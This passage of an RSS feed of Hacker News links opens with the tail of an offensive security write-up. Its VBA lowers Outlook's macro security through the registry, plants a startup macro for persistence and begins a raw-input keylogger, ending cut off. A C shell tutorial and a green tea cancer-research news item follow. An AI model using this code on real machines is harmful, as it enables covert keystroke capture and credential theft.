  <span>Set</span> <span>myWS</span> <span>=</span> <span>VBA</span><span>.</span><span>CreateObject</span><span>(</span><span>"WScript.Shell"</span><span>)</span>
  <span>Dim</span> <span>name</span> <span>As</span> <span>String</span><span>,</span> <span>value</span> <span>As</span> <span>Integer</span><span>,</span> <span>stype</span> <span>As</span> <span>String</span>
  <span>name</span> <span>=</span> <span>"HKEY_CURRENT_USER\Software\Microsoft\Office\"</span> <span>&amp;</span> <span>Application</span><span>.</span><span>Version</span> <span>&amp;</span> <span>"\Outlook\Security\Level"</span>
  <span>value</span> <span>=</span> <span>1</span>
  <span>stype</span> <span>=</span> <span>"REG_DWORD"</span>
  <span>myWS</span><span>.</span><span>RegWrite</span> <span>name</span><span>,</span> <span>value</span><span>,</span> <span>stype</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We use the Excel version (<code>Application.Version</code>) to calculate the right location of the key to be modified. After that the OTM file can be dropped to <code>Environ("appdata") &amp; "\Microsoft\Outlook\VbaProject.OTM"</code> (it can be packed inside a resource, form, or taken directly from internet and then read/unpack and dropped). It is nothing new, all the good ol‚Äô techniques to drop files apply here, let‚Äôs move to the OTM contents and the keylogger.</p> <p>For our keylogger we are going to use the function <strong><code>NtUserGetRawInputData</code></strong> that is not documented in the MSDN. But as usual: if something is not covered by Microsoft, go and check ReactOS. Luckily it is <a href="https://doxygen.reactos.org/d0/dc0/ntstubs_8c.html#ad041c37a6375f9be19cac8f4636d468e">documented</a>:</p> <div><div><pre><code><span>DWORD</span> <span>APIENTRY</span> <span>NtUserGetRawInputData</span> 	<span>(</span> 	<span>HRAWINPUT</span>  	<span>hRawInput</span><span>,</span>
		<span>UINT</span>  	<span>uiCommand</span><span>,</span>
		<span>LPVOID</span>  	<span>pData</span><span>,</span>
		<span>PUINT</span>  	<span>pcbSize</span><span>,</span>
		<span>UINT</span>  	<span>cbSizeHeader</span> 
	<span>)</span> 	
</code></pre></div></div> <p>Also we can see that it is exported by <a href="https://strontic.github.io/xcyclopedia/library/win32u.dll-7D649393F89A9DE3058162F8442130BC.html#win32udll">win32u.dll</a>, so our definition in VBA will be:</p> <div><div><pre><code><span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHeader</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>LongLong</span>
</code></pre></div></div> <p>Our approach will be the well-known technique of creating a window with a callback to snoop messages until we get a <code>WM_INPUT</code> and then use <code>NtUserGetRawInputData</code> to get the input data. To build the structures correctly (like <code>RAWKEYBOARD</code>) we can use <strong><code>offsetof</code></strong> as we described in our article <a href="https://adepts.of0x.cc/vba-tools/">Shedding light on creating VBA macros</a>, so we can check the size of each field and pick VBA types accordingly.</p> <p>Our macro has to be split in two parts</p> <ol> <li>The default module <code>ThisOutlookSession</code></li> <li>Another module created by us that we will rename to <code>Keylogger</code>.</li> </ol> <p>In <code>ThisOutlookSession</code> we only place the trigger that will execute our payload when Outlook starts:</p> <div><div><pre><code><span>Sub</span> <span>Application_Startup</span><span>()</span>
   <span>Keylogger</span><span>.</span><span>launcher</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We need to place the ‚Äúreal‚Äù payload inside another module to be allowed to use the operator <strong><a href="https://docs.microsoft.com/es-es/office/vba/language/reference/user-interface-help/invalid-use-of-addressof-operator">AddressOf</a></strong>, because we use it to set the callback to our window class. The <code>Keylogger</code> module code (remember: <strong>this is just a PoC</strong> that does not handle errors/exceptions, the intention of this code is just to exemplify how to build one):</p> <div><div><pre><code><span>'This can be hidden using DispCallFunc trick</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterClassEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"RegisterClassExA"</span> <span>(</span><span>pcWndClassEx</span> <span>As</span> <span>WNDCLASSEX</span><span>)</span> <span>As</span> <span>Integer</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>CreateWindowEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"CreateWindowExA"</span> <span>(</span><span>ByVal</span> <span>dwExStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>lpClassName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>lpWindowName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>dwStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>x</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>y</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nWidth</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nHeight</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>hWndParent</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hMenu</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hInstance</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lpParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DefWindowProc</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DefWindowProcA"</span> <span>(</span><span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsg</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wParam</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"GetMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>,</span> <span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMin</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMax</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>TranslateMessage</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DispatchMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DispatchMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetModuleHandle</span> <span>Lib</span> <span>"kernel32"</span> <span>Alias</span> <span>"GetModuleHandleA"</span> <span>(</span><span>ByVal</span> <span>lpModuleName</span> <span>As</span> <span>String</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterRawInputDevices</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>ByRef</span> <span>pRawInputDevices</span> <span>As</span> <span>RAWINPUTDEVICE</span><span>,</span> <span>ByVal</span> <span>uiNumDevices</span> <span>As</span> <span>Integer</span><span>,</span> <span>ByVal</span> <span>cbSize</span> <span>As</span> <span>Integer</span><span>)</span> <span>As</span> <span>Boolean</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHead‚Ä¶</span></code></pre></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adepts.of0x.cc/vba-outlook/">https://adepts.of0x.cc/vba-outlook/</a></em></p>]]>
            </description>
            <link>https://adepts.of0x.cc/vba-outlook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126067</guid>
            <pubDate>Sat, 13 Feb 2021 19:35:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Write a Shell in C]]>
            </title>
            <description>
<![CDATA[
Score 268 | Comments 75 (<a href="https://news.ycombinator.com/item?id=26126010">thread link</a>) | @mindcrime
<br/>
February 13, 2021 | https://brennan.io/2015/01/16/write-a-shell-in-c/ | <a href="https://web.archive.org/web/*/https://brennan.io/2015/01/16/write-a-shell-in-c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
<p><em>Stephen Brennan ‚Ä¢ 16 January 2015</em></p><p>It‚Äôs easy to view yourself as ‚Äúnot a <em>real</em> programmer.‚Äù  There are programs out
there that everyone uses, and it‚Äôs easy to put their developers on a pedestal.
Although developing large software projects isn‚Äôt easy, many times the basic
idea of that software is quite simple.  Implementing it yourself is a fun way to
show that you have what it takes to be a real programmer.  So, this is a
walkthrough on how I wrote my own simplistic Unix shell in C, in the hopes that
it makes other people feel that way too.</p>

<p>The code for the shell described here, dubbed <code>lsh</code>, is available on
<a href="https://github.com/brenns10/lsh">GitHub</a>.</p>

<p><strong>University students beware!</strong> Many classes have assignments that ask you to
write a shell, and some faculty are aware of this tutorial and code.  If you‚Äôre
a student in such a class, you shouldn‚Äôt copy (or copy then modify) this code
without permission.  And even then, I would <a href="https://brennan.io/2016/03/29/dishonesty/">advise</a> against heavily relying on this tutorial.</p>

<h2 id="basic-lifetime-of-a-shell">Basic lifetime of a shell</h2>

<p>Let‚Äôs look at a shell from the top down.  A shell does three main things in its
lifetime.</p>

<ul>
  <li><strong>Initialize</strong>: In this step, a typical shell would read and execute its
configuration files.  These change aspects of the shell‚Äôs behavior.</li>
  <li><strong>Interpret</strong>: Next, the shell reads commands from stdin (which could be
interactive, or a file) and executes them.</li>
  <li><strong>Terminate</strong>: After its commands are executed, the shell executes any
shutdown commands, frees up any memory, and terminates.</li>
</ul>

<p>These steps are so general that they could apply to many programs, but we‚Äôre
going to use them for the basis for our shell.  Our shell will be so simple that
there won‚Äôt be any configuration files, and there won‚Äôt be any shutdown command.
So, we‚Äôll just call the looping function and then terminate.  But in terms of
architecture, it‚Äôs important to keep in mind that the lifetime of the program is
more than just looping.</p>

<div><div><pre><code><span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span>
<span>{</span>
  <span>// Load config files, if any.
</span>
  <span>// Run command loop.
</span>  <span>lsh_loop</span><span>();</span>

  <span>// Perform any shutdown/cleanup.
</span>
  <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here you can see that I just came up with a function, <code>lsh_loop()</code>, that will
loop, interpreting commands.  We‚Äôll see the implementation of that next.</p>

<h2 id="basic-loop-of-a-shell">Basic loop of a shell</h2>

<p>So we‚Äôve taken care of how the program should start up.  Now, for the basic
program logic: what does the shell do during its loop?  Well, a simple way to
handle commands is with three steps:</p>

<ul>
  <li><strong>Read</strong>: Read the command from standard input.</li>
  <li><strong>Parse</strong>: Separate the command string into a program and arguments.</li>
  <li><strong>Execute</strong>: Run the parsed command.</li>
</ul>

<p>Here, I‚Äôll translate those ideas into code for <code>lsh_loop()</code>:</p>

<div><div><pre><code><span>void</span> <span>lsh_loop</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span><span>;</span>
  <span>char</span> <span>**</span><span>args</span><span>;</span>
  <span>int</span> <span>status</span><span>;</span>

  <span>do</span> <span>{</span>
    <span>printf</span><span>(</span><span>"&gt; "</span><span>);</span>
    <span>line</span> <span>=</span> <span>lsh_read_line</span><span>();</span>
    <span>args</span> <span>=</span> <span>lsh_split_line</span><span>(</span><span>line</span><span>);</span>
    <span>status</span> <span>=</span> <span>lsh_execute</span><span>(</span><span>args</span><span>);</span>

    <span>free</span><span>(</span><span>line</span><span>);</span>
    <span>free</span><span>(</span><span>args</span><span>);</span>
  <span>}</span> <span>while</span> <span>(</span><span>status</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Let‚Äôs walk through the code.  The first few lines are just declarations.  The
do-while loop is more convenient for checking the status variable, because it
executes once before checking its value.  Within the loop, we print a prompt,
call a function to read a line, call a function to split the line into args, and
execute the args.  Finally, we free the line and arguments that we created
earlier.  Note that we‚Äôre using a status variable returned by <code>lsh_execute()</code> to
determine when to exit.</p>

<h2 id="reading-a-line">Reading a line</h2>

<p>Reading a line from stdin sounds so simple, but in C it can be a hassle.  The
sad thing is that you don‚Äôt know ahead of time how much text a user will enter
into their shell.  You can‚Äôt simply allocate a block and hope they don‚Äôt exceed
it.  Instead, you need to start with a block, and if they do exceed it,
reallocate with more space.  This is a common strategy in C, and we‚Äôll use it to
implement <code>lsh_read_line()</code>.</p>

<div><div><pre><code><span>#define LSH_RL_BUFSIZE 1024
</span><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
  <span>int</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>*</span><span>buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>char</span><span>)</span> <span>*</span> <span>bufsize</span><span>);</span>
  <span>int</span> <span>c</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
    <span>// Read a character
</span>    <span>c</span> <span>=</span> <span>getchar</span><span>();</span>

    <span>// If we hit EOF, replace it with a null character and return.
</span>    <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>EOF</span> <span>||</span> <span>c</span> <span>==</span> <span>'\n'</span><span>)</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
      <span>return</span> <span>buffer</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>c</span><span>;</span>
    <span>}</span>
    <span>position</span><span>++</span><span>;</span>

    <span>// If we have exceeded the buffer, reallocate.
</span>    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
      <span>buffer</span> <span>=</span> <span>realloc</span><span>(</span><span>buffer</span><span>,</span> <span>bufsize</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The first part is a lot of declarations.  If you hadn‚Äôt noticed, I prefer to
keep the old C style of declaring variables before the rest of the code.  The
meat of the function is within the (apparently infinite) <code>while (1)</code> loop.  In
the loop, we read a character (and store it as an <code>int</code>, not a <code>char</code>, that‚Äôs
important!  EOF is an integer, not a character, and if you want to check for it,
you need to use an <code>int</code>.  This is a common beginner C mistake.).  If it‚Äôs the
newline, or EOF, we null terminate our current string and return it.  Otherwise,
we add the character to our existing string.</p>

<p>Next, we see whether the next character will go outside of our current buffer
size.  If so, we reallocate our buffer (checking for allocation errors) before
continuing.  And that‚Äôs really it.</p>

<p>Those who are intimately familiar with newer versions of the C library may note
that there is a <code>getline()</code> function in <code>stdio.h</code> that does most of the work we
just implemented.  To be completely honest, I didn‚Äôt know it existed until after
I wrote this code.  This function was a GNU extension to the C library until
2008, when it was added to the specification, so most modern Unixes should have
it now.  I‚Äôm leaving my existing code the way it is, and I encourage people to
learn it this way first before using <code>getline</code>.  You‚Äôd be robbing yourself of a
learning opportunity if you didn‚Äôt!  Anyhow, with <code>getline</code>, the function
becomes easier:</p>

<div><div><pre><code><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>ssize_t</span> <span>bufsize</span> <span>=</span> <span>0</span><span>;</span> <span>// have getline allocate a buffer for us
</span>
  <span>if</span> <span>(</span><span>getline</span><span>(</span><span>&amp;</span><span>line</span><span>,</span> <span>&amp;</span><span>bufsize</span><span>,</span> <span>stdin</span><span>)</span> <span>==</span> <span>-</span><span>1</span><span>){</span>
    <span>if</span> <span>(</span><span>feof</span><span>(</span><span>stdin</span><span>))</span> <span>{</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>  <span>// We recieved an EOF
</span>    <span>}</span> <span>else</span>  <span>{</span>
      <span>perror</span><span>(</span><span>"readline"</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>line</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is not 100% trivial because we still need to check for EOF or errors while
reading. EOF (end of file) means that either we were reading commands from a
text file which we‚Äôve reached the end of, or the user typed Ctrl-D, which
signals end-of-file. Either way, it means we should exit successfully, and if
any other error occurs, we should fail after printing the error.</p>

<h2 id="parsing-the-line">Parsing the line</h2>

<p>OK, so if we look back at the loop, we see that we now have implemented
<code>lsh_read_line()</code>, and we have the line of input.  Now, we need to parse that
line into a list of arguments.  I‚Äôm going to make a glaring simplification here,
and say that we won‚Äôt allow quoting or backslash escaping in our command line
arguments.  Instead, we will simply use whitespace to separate arguments from
each other.  So the command <code>echo "this message"</code> would not call echo with a
single argument <code>this message</code>, but rather it would call echo with two
arguments: <code>"this</code> and <code>message"</code>.</p>

<p>With those simplifications, all we need to do is ‚Äútokenize‚Äù the string using
whitespace as delimiters.  That means we can break out the classic library
function <code>strtok</code> to do some of the dirty work for us.</p>

<div><div><pre><code><span>#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"
</span><span>char</span> <span>**</span><span>lsh_split_line</span><span>(</span><span>char</span> <span>*</span><span>line</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_TOK_BUFSIZE</span><span>,</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>**</span><span>tokens</span> <span>=</span> <span>malloc</span><span>(</span><span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
  <span>char</span> <span>*</span><span>token</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>line</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>while</span> <span>(</span><span>token</span> <span>!=</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>token</span><span>;</span>
    <span>position</span><span>++</span><span>;</span>

    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_TOK_BUFSIZE</span><span>;</span>
      <span>tokens</span> <span>=</span> <span>realloc</span><span>(</span><span>tokens</span><span>,</span> <span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
      <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>

    <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>NULL</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>}</span>
  <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>return</span> <span>tokens</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>If this code looks suspiciously similar to <code>lsh_read_line()</code>, it‚Äôs because it
is!  We are using the same strategy of having a buffer and dynamically expanding
it.  But this time, we‚Äôre doing it with a null-terminated array of pointers
instead of a null-terminated array of characters.</p>

<p>At the start of the function, we begin tokenizing by calling <code>strtok</code>.  It
returns a pointer to the first token.  What <code>strtok()</code> actually does is return
pointers to within the string you give it, and place <code>\0</code> bytes at the end of
each token.  We store each pointer in an array (buffer) of character
pointers.</p>

<p>Finally, we reallocate the array of pointers if necessary.  The process repeats
until no token is returned by <code>strtok</code>, at which point we null-terminate the
list of tokens.</p>

<p>So, once all is said and done, we have an array of tokens, ready to execute.
Which begs the question, how do we do that?</p>



<p>Now, we‚Äôre really at the heart of what a shell does.  Starting processes is the
main function of shells.  So writing a shell means that you need to know exactly
what‚Äôs going on with processes and how they start.  That‚Äôs why I‚Äôm going to take
us on a short diversion to discuss processes in Unix.</p>

<p>There are only two ways of starting processes on Unix.  The first one (which
almost doesn‚Äôt count) is by being Init.  You see, when a Unix computer boots,
its kernel is loaded.  Once it is loaded and initialized, the kernel starts only
one process, which is called Init.  This process runs for the entire length of
time that the computer is on, and it manages loading up the rest of the
processes that you need for your computer to be useful.</p>

<p>Since most programs aren‚Äôt Init, that leaves only one practical way for
processes to get started: the <code>fork()</code> system call.  When ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://brennan.io/2015/01/16/write-a-shell-in-c/">https://brennan.io/2015/01/16/write-a-shell-in-c/</a></em></p>]]>
            </description>
            <link>https://brennan.io/2015/01/16/write-a-shell-in-c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126010</guid>
            <pubDate>Sat, 13 Feb 2021 19:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Antioxidant in green tea may increase levels of p53, an anti-cancer protein]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26125671">thread link</a>) | @finphil
<br/>
February 13, 2021 | https://nuadox.com/post/643030841522536448/green-tea-p53-protein | <a href="https://web.archive.org/web/*/https://nuadox.com/post/643030841522536448/green-tea-p53-protein">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="643030841522536448">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/643030841522536448/green-tea-p53-protein"><h2>Antioxidant in green tea may increase levels of p53, an anti-cancer protein</h2></a>
                                <figure data-orig-width="1280" data-orig-height="855"><img src="https://64.media.tumblr.com/f6a0a630187afd9268b0372fbcc4e09e/1ae3647e82144769-00/s1280x1920/fc9b00fcd69f86ea10d75049e36b11fb66730a5e.jpg" alt="image" data-orig-width="1280" data-orig-height="855" width="1280" height="855"></figure><p><b>- By&nbsp;<a href="https://href.li/?https://info.rpi.edu/people/mary-l-martialay">Mary L. Martialay</a> ,&nbsp;<a href="https://href.li/?https://www.rpi.edu/">Rensselaer Polytechnic Institute</a> -</b></p><p>An antioxidant found in green tea may increase levels of p53, a natural anti-cancer protein, known as the ‚Äúguardian of the genome‚Äù for its ability to repair DNA damage or destroy cancerous cells.&nbsp;</p><p>Published on February 12 in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-021-21258-5&amp;t=ODVhMjI2YzVjMzA1YjA4M2MwYWY5NWI5NDgwYWMwM2ZiYzFiNjU2ZixlUURrZXFETg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F643030841522536448%2Fgreen-tea-p53-protein&amp;m=0&amp;ts=1613494260"><i>Nature Communications</i>,</a> a study of the direct interaction between p53 and the green tea compound, epigallocatechin gallate (EGCG), points to a new target for cancer drug discovery.</p><p>‚ÄúBoth p53 and EGCG molecules are extremely interesting. Mutations in p53 are found in over 50% of human cancer, while EGCG is the major anti-oxidant in green tea, a popular beverage worldwide,‚Äù said <a href="https://href.li/?http://homepages.rpi.edu/~wangc5/index.html">Chunyu Wang</a>, corresponding author and a professor of biological sciences at <a href="https://href.li/?https://rpi.edu/">Rensselaer Polytechnic Institute</a>. ‚ÄúNow we find that there is a previously unknown, direct interaction between the two, which points to a new path for developing anti-cancer drugs. Our work helps to explain how EGCG is able to boost p53‚Äôs anti-cancer activity, opening the door to developing drugs with EGCG-like compounds.‚Äù</p><p>Wang, a member of the <a href="https://href.li/?https://www.youtube.com/watch?v=Hm_O0FqYSt4">Rensselaer Center for Biotechnology and Interdisciplinary Studies</a>, is an expert in using nuclear magnetic resonance spectroscopy to study <a href="https://href.li/?https://news.rpi.edu/content/2021/01/26/new-nih-grant-supports-single-molecule-study-protein-key-alzheimer-%E2%80%99s-disease">specific mechanisms in Alzheimer‚Äôs disease</a> and <a href="https://href.li/?https://news.rpi.edu/content/2017/02/27/hedgehog-cancer-and-zinc">cancer</a>, including p53, which he described as ‚Äúarguably the most important protein in human cancer.‚Äù</p><p>P53 has several well-known anti-cancer functions, including halting cell growth to allow for DNA repair, activating DNA repair, and initiating programmed cell death ‚Äî called apoptosis ‚Äî if DNA damage cannot be repaired. One end of the protein, known as the N-terminal domain, has a flexible shape, and therefore, can potentially serve several functions depending on its interaction with multiple molecules.</p><p>EGCG is a natural antioxidant, which means it helps to undo the near constant damage caused during oxygen metabolism. Found in abundance in green tea, EGCG is also packaged as an herbal supplement.</p><p>Wang‚Äôs team found that the interaction between EGCG and p53 preserves the protein against degradation. Typically, after being produced within the body, p53 is quickly degraded when the N-terminal domain interacts with a protein called MDM2. This regular cycle of production and degradation holds p53 levels at a low constant.</p><p>‚ÄúBoth EGCG and MDM2 bind at the same place on p53, the N-terminal domain, so EGCG competes with MDM2,‚Äù said Wang. ‚ÄúWhen EGCG binds with p53, the protein is not being degraded through MDM2, so the level of p53 will increase with the direct interaction with EGCG, and that means there is more p53 for anti-cancer function. This is a very important interaction.‚Äù</p><p>‚ÄúBy developing an understanding of the molecular-level mechanisms that control key biochemical interactions linked to devastating illnesses such as cancer and Alzheimer‚Äôs disease, Chunyu‚Äôs research is laying the groundwork for new and successful therapies,‚Äù said Curt Breneman, dean of the Rensselaer School of Science.</p><p>‚Äì</p><p><b>Source:&nbsp;<a href="https://href.li/?https://news.rpi.edu/content/2021/02/12/green-tea-compound-aids-p53-guardian-genome-and-tumor-suppressor">Rensselaer Polytechnic Institute</a></b></p><p><b>Full study:</b>&nbsp;‚ÄúEGCG binds intrinsically disordered N-terminal domain of p53 and disrupts p53-MDM2 interaction‚Äù, <i>Nature Communications</i>.</p><p><a href="https://href.li/?https://doi.org/10.1038/s41467-021-21258-5">https://doi.org/10.1038/s41467-021-21258-5</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/625997758414929920/synthesizing-cepafungin">Chemists efficiently synthesize natural anti-cancer compound cepafungin I</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/tea">tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/green-tea">green tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/cancer">cancer</a>
                                    
                                        <a href="https://nuadox.com/tagged/oncology">oncology</a>
                                    
                                        <a href="https://nuadox.com/tagged/antioxidants">antioxidants</a>
                                    
                                        <a href="https://nuadox.com/tagged/p53">p53</a>
                                    
                                        <a href="https://nuadox.com/tagged/dna">dna</a>
                                    
                                        <a href="https://nuadox.com/tagged/genetics">genetics</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/egcg">egcg</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/643030841522536448/green-tea-p53-protein</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125671</guid>
            <pubDate>Sat, 13 Feb 2021 18:50:45 GMT</pubDate>
        </item>
